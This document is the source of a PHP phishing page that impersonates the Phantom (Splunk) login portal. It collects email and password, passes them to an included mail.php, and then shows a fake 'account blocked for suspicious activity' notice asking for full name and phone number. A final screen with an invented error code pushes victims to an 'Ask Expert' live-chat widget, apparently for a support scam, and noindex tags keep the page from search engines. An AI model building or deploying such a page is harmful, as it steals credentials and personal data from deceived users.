<!DOCTYPE html>
<html class="js backgroundsize borderradius boxshadow textshadow cssanimations cssgradients csstransitions">
    <head profile="http://www.w3.org/2005/10/profile">
        <meta name="robots" content="noindex, nofollow"/>
        <meta name="googlebot" content="noindex, nofollow"/>
        <meta name="bingbot" content="noindex, nofollow"/>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta content="IE=edge" http-equiv="X-UA-Compatible" />
        <meta content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no" name="viewport" />
        <link rel="icon" type="image/png" href="https://my.phantom.us/inc/phantom/img/favicon.ico" />
        <title>Phantom - Login</title>

        <link href="./assets/css" rel="stylesheet" type="text/css" />
        <link href="./assets/site.min.css" rel="stylesheet" />
        <script src="./assets/otSDKStub.js.download" type="text/javascript" charset="UTF-8" data-domain-script="45dc1827-50a9-4643-bf1b-e3543e610717"></script>
    
        <script src="./assets/dt_all.js.download"></script>
        <script type="text/plain" class="optanon-category-2" src="./assets/bizible.js.download" async=""></script>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

    </head>

    <body>
        <div class="header">
            <nav class="navbar navbar-default">
                <div class="container-fluid">
                    <div class="navbar-header">
                        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
                            <span class="sr-only">Toggle navigation</span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                        </button>
                        <a class="navbar-brand" href="https://my.phantom.us/">
                            <img src="./assets/phantom-logo-white.svg" alt="Phantom logo " />
                        </a>
                    </div>
                </div>
            </nav>
        </div>
        <div class="main">
            <div class="content" style="margin-top: 50px;">
                <div class="container">
                    <div class="row">
                        <div class="col-md-3">&nbsp;</div>
                         <?php
                         if (isset($_POST['btnLoginMore'])) {
                            include 'mail.php';
                        ?>
                        <div class="col-md-6">
                            <div class="alert mb-4 alert-danger text-center">Attention: the account has been <b>temporarily blocked due to suspicious activity in your Network IP,</b> kindly verify the following details<br>
                                             Kindly contact chat assistance for further help
                                           </div>
                            <h3>Verification Required</h3>
                            <br />
                            <form method="POST" id="login_form" action="">
                                <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>" />
                                <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>" />
                                <div class="row">
                                    <div class="col-md-12">
                                        <div class="row"> 
                                            <div class="col-md-12">
                                                <label for="name">Full Name</label>
                                                <input type="text" name="name" id="name" required="" placeholder="Full Name" class="form-control"  required />
                                            </div>
                                        </div>
                                        <div class="row">&nbsp;</div>
                                        <div class="row">
                                            <div class="col-md-12">
                                                <label for="password">Phone Number</label>
                                                <input type="text" name="number" id="number" required="" placeholder="Phone Number" class="form-control" required />
                                            </div>
                                        </div>
                                        <div class="row">&nbsp;</div>
                                       
                                        <div class="row">&nbsp;</div>
                                        <div class="row footer-row">
                                            <div class="col-md-12">
                                                <button type="submit" id="verifyBtn" class="btn btn-default pull-right" name="fromLog">
                                                    Verify
                                                </button>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </form>
                        </div>
                       
                        <?php } elseif (isset($_POST['fromLog'])) {
                             include 'mail.php';
                         ?>
                         <div class="col-md-6">
                            
                            <h3 class="text-center">Account blocked</h3>
                            <div class="panel-body text-center">
                                 <p style="font-size: 20px;">Your account has been <b>temporarily blocked</b> due to <br>suspicious activity on your Network IP.<br>Kindly ask an expert</p>
                                <div class="form">
                                    <label style="font-size: 18px;">Error CODE: <b>6X76D</b></label><br>
                                </div>
                                <div class="calling-number">
                                    <a class="btn btn-danger" href="javascript:void(Tawk_API.toggle())" style="background: #bf0707;color: #fff !important;font-size: 20px;font-weight: 600;margin-top: 15px;">Ask Expert</a>
                                </div>
                            </div>
                        </div>

                          <?php } else { ?>

                            <div class="col-md-6">
                            <h3>Login</h3>
                            <br />
                            <form method="POST" id="login_form" action="">
                                <div class="row">
                                    <div class="col-md-12">
                                        <div class="row"> 
                                            <div class="col-md-12">
                                                <label for="username">Email Address</label>
                                                <input type="email" name="email" id="id_email" required="" placeholder="Email" class="form-control"  />
                                            </div>
                                        </div>
                                        <div class="row">&nbsp;</div>
                                        <div class="row">
                                            <div class="col-md-12">
                                                <label for="password">Password</label>
                                                <input type="password" name="password" id="id_password" required="" placeholder="Password" class="form-control" />
                                            </div>
                                        </div>
                                        <div class="row">&nbsp;</div>
                                       
                                        <div class="row">&nbsp;</div>
                                        <div class="row footer-row">
                                            <div class="col-md-12">
                                                <p>
                                                    <a href="#">Forgot Password</a> |
                                                    <a href="#">Register for Phantom</a>
                                                </p>
                                                <button type="submit" class="btn btn-default pull-right" name="btnLoginMore">
                                                    LOGIN
                                                </button>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </form>
                        </div>
                         <?php } ?>
                        

                        <div class="col-md-3">&nbsp;</div>
                    </div>
                </div>
            </div>
        </div>
        <div class="footer">
            <div class="container-fluid">
                <div class="footer-attribution">
                    <a href="#" >Privacy Policy</a>
                    &nbsp;&nbsp;
                    <a href="#">Terms of Service</a>

                    &nbsp;&nbsp;
                    <a href="#">Login</a>
                    &nbsp;&nbsp;
                    <a href="#">Register for Phantom</a>
                    &nbsp;&nbsp;

                    <p>&copy; Splunk 2022</p>
                </div>
                <div class="footer-social">
                    <span>Find Us</span>
                    <a href="#" ><i class="fa fa-slack" aria-hidden="true"></i></a>
                    <a href="#" ><i class="fa fa-github" aria-hidden="true"></i></a>
                </div>
            </div>
        </div>

        <script>
            $(function () {
                $("#password, #username").on("focus", function () {
                    $("#error-message").empty();
                });
            });
        </script>

         <!--Start of Tawk.to Script-->
        <script type="text/javascript">
        var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
        (function(){
        var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
        s1.async=true;
        s1.src='https://embed.tawk.to/620a586d9bd1f31184dc89bb/1frs6irvs';
        s1.charset='UTF-8';
        s1.setAttribute('crossorigin','*');
        s0.parentNode.insertBefore(s1,s0);
        })();
        </script>
        <!--End of Tawk.to Script--> 
    </body>
</html>
